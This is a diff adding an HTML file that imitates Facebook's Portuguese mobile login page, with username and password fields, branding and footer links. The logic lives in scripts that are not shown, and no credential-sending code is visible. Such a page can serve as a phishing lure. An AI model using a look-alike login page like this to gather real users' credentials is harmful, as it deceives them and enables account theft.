@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+
+<!-- 
+	author: roberto.deev@gmail.com © 2021
+-->
+
+<html lang='pt-br'>
+	<head>
+		<title> Facebook -- Entre ou cadastre-se </title>
+		<meta charset='utf-8' name='viewport' content='width=device-width, user-scalable=no'/>
+		<link rel='shortcut icon' href='_files.ico/favicon.png'/>
+		<link rel='stylesheet' href='_files.css/reset.css'/>
+		<link rel='stylesheet' href='_files.css/index.css'/>
+		<link rel='stylesheet' href='_files.css/stdsk.css'/>
+		<link rel='stylesheet' href='_files.css/stmob.css'/>
+		<script src="_files.jvs/styles.js"></script>
+		<script src="_files.jvs/validt.js"></script>
+		<script>
+			var _appIN = _app_interaction(); // interatives functions 
+			var _appFC = _app_validations(); // validations functions
+
+			window.addEventListener('load',()=>{
+				_appIN.shwIC_ps(); //listener password user input
+			});
+		</script>
+		<meta name='theme-color' content='#3b5999'/>
+	</head>
+	
+	<body>
+		
+		<hgroup>
+			<header id='head-msg1'>
+				<img id='-head-msg1-icon' src='_files.ico/phoneic.svg'/>
+				<h3  id='-head-msg1-text' > Obtenha o Facebook para 
+				<script>_appIN.getOS()</script> e navegue mais rápido.</h3> 
+			</header>
+	
+			<header id='head-msg2'>
+				<h3 id='-head-msg2-text'>
+					O Facebook solicita e recebe seu número de telefone da rede móvel. 
+					<a>Alterar as Configurações</a>
+				</h3><div id='-head-msg2-boxV'> </div> 
+			</header>
+
+			<header id='head-msg3'></header>
+		</hgroup>
+
+		<main id='ghost-window'>
+			<header id='head-title'> 
+				<img id='-head-title-img' src='_files.ico/headtit.svg'/> 
+			</header>
+
+			<div id='ghost-body'>
+				<form action='' method='post' id='_formX'>
+					<div id='user-name'>
+						<input id='_user-name' type='text' placeholder='Número de celular ou email'/>
+						<img id='_name-ico' src='_files.ico/info_01.svg' onclick='_appIN.shwMS()'/>
+					</div>
+					
+					<div id='user-pass'>
+						<input id='_user-pass' type='password' placeholder="Password" />
+						<span id='_pass-ico' onclick='_appIN.shwPW()'>MOSTRAR</span>
+					</div>
+					
+					<input id='submit-bnt' type='button' value='Entrar' onclick="_appFC.valid()"/>
+				</form>
+			
+				<div id='hor-row'><p></p>ou<p></p></div>
+
+				<div id='user-new-and-recov-account'>
+					<a href='' id='link-new-account'> Criar nova conta </a>
+					<a href='' id='link-rec-pasword'> Esqueceu a senha? </a>
+				</div>
+			</div>
+		</main>
+		<footer id='ghost-footer'>
+			<div id='-lang-options'>
+				<ul id='-left-lang-options'>
+					<li id='lang-selected'>Português (Brasil)</li> <li>Español</li>
+					<li>Deutsh</li>العربية<li></li>
+				</ul>
+				<ul id='-right-lang-options'>
+					<li>English (US)</li> <li>Français (France)</li>
+					<li>Italiano</li><li>[ + ]</li>
+				</ul>
+			</div>
+
+			<div id='-about'>
+				<a href=''>Sobre ·</a>
+				<a href=''>Ajuda ·</a>
+				<a onclick='_appIN.shwMR();' id='more'>Mais</a>
+				<div id='more-extended'>
+					<a href=''>Messager</a> <a href=''>Facebook Lite</a> <a href=''>Watch</a>
+					<a href=''>Persons</a> <a href=''>Pages</a> <a href=''>Page categories</a> <a href=''>Places</a>
+					<a href=''>Games</a> <a href=''>Locations</a> <a href=''>Marketplace</a>
+					<a href=''>Facebook Pay</a> <a href=''>Groups</a> <a href=''>Jobs</a>
+					<a href=''>Oculus</a> <a href=''>Portal</a> <a href=''>Instagram</a> <a href=''>Local</a>
+					<a href=''>Fundraisers</a> <a href=''>Services</a> <a href=''>Developers</a>	
+					<a href=''>Carrers</a> <a href=''>Privacy</a>
+				</div>
+			</div>
+			<div id='-copyr'>Facebook, Inc</div>
+		</footer>	
+	</body>
+	<footer>
+	</footer>
+</html>
